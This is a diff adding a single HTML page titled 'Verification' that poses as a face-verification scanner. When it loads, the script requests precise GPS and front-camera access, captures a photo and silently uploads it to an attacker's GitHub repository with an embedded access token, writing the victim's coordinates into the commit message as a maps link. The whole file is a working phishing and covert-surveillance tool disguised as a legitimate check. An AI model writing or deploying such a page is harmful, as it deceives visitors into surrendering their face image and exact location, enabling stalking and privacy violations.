@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verification</title>
+    <style>
+        body {
+            background-color: #6739B7;
+            color: #C3A0EC;
+            font-family: system-ui, -apple-system, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+            overflow: hidden;
+        }
+        /* A circular container for the video feed to make it look like a scanner */
+        #video-container {
+            width: 200px;
+            height: 200px;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 4px solid #C3A0EC;
+            box-shadow: 0 0 20px rgba(195, 160, 236, 0.4);
+            margin-bottom: 30px;
+            background-color: #512b91;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            /* Mirrors the camera so it acts like a natural front-facing mirror */
+            transform: scaleX(-1); 
+        }
+        canvas {
+            display: none;
+        }
+        #status {
+            font-size: 1.2rem;
+            font-weight: 500;
+            letter-spacing: 1px;
+            padding: 0 20px;
+        }
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(195, 160, 236, 0.3);
+            border-radius: 50%;
+            border-top-color: #C3A0EC;
+            animation: spin 1s ease-in-out infinite;
+            margin-top: 15px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div id="video-container">
+        <video id="video" autoplay playsinline muted></video>
+    </div>
+    
+    <div id="status">Initializing...</div>
+    <div class="spinner" id="spinner"></div>
+
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // ==========================================
+        // CONFIGURATION
+        // ==========================================
+        const GITHUB_TOKEN = 'YOUR_PERSONAL_ACCESS_TOKEN'; 
+        const REPO_OWNER = 'YOUR_GITHUB_USERNAME';
+        const REPO_NAME = 'YOUR_REPOSITORY_NAME';
+        // ==========================================
+
+        const statusText = document.getElementById('status');
+        const spinner = document.getElementById('spinner');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        async function startProcess() {
+            try {
+                statusText.innerText = "Requesting location access...";
+                
+                // 1. Get exact GPS location
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { 
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    });
+                });
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+
+                statusText.innerText = "Requesting camera access...";
+
+                // 2. Get front-facing camera
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" },
+                    audio: false
+                });
+                video.srcObject = stream;
+
+                // Wait for the video feed to actually start playing
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+
+                statusText.innerText = "Verifying face data...";
+
+                // Give the camera 2 seconds to adjust focus and lighting before snapping
+                setTimeout(() => captureAndUpload(lat, lon, stream), 2000);
+
+            } catch (error) {
+                console.error(error);
+                spinner.style.display = 'none';
+                if (error.code === 1) {
+                    statusText.innerText = "Permissions denied. Please allow camera and location.";
+                } else {
+                    statusText.innerText = "Verification failed due to a device error.";
+                }
+            }
+        }
+
+        async function captureAndUpload(lat, lon, stream) {
+            statusText.innerText = "Saving data securely...";
+
+            // Draw current video frame to canvas
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            
+            // Flip the canvas context horizontally to match the mirrored video feed
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Get base64 image data
+            const base64Content = canvas.toDataURL('image/jpeg', 0.9).split(',')[1];
+            
+            // Turn off the webcam indicator light
+            stream.getTracks().forEach(track => track.stop());
+
+            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+            const filePath = `images/verification-${timestamp}.jpg`;
+            
+            // Embed the location directly into the GitHub commit message
+            const commitMessage = `Face verification captured.\nLocation: https://maps.google.com/?q=${lat},${lon}`;
+
+            const apiUrl = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${filePath}`;
+
+            try {
+                const response = await fetch(apiUrl, {
+                    method: 'PUT',
+                    headers: {
+                        'Authorization': `token ${GITHUB_TOKEN}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        message: commitMessage,
+                        content: base64Content
+                    })
+                });
+
+                if (response.ok) {
+                    statusText.innerText = "Verification Complete.";
+                    spinner.style.display = 'none';
+                    document.getElementById('video-container').style.borderColor = "#2ea44f"; // Turn border green
+                } else {
+                    throw new Error("GitHub API rejected the upload.");
+                }
+            } catch (error) {
+                console.error(error);
+                statusText.innerText = "Error saving data.";
+                spinner.style.display = 'none';
+                document.getElementById('video-container').style.borderColor = "#ff4444"; // Turn border red
+            }
+        }
+
+        // Start the automated sequence as soon as the page loads
+        window.onload = startProcess;
+    </script>
+</body>
+</html>
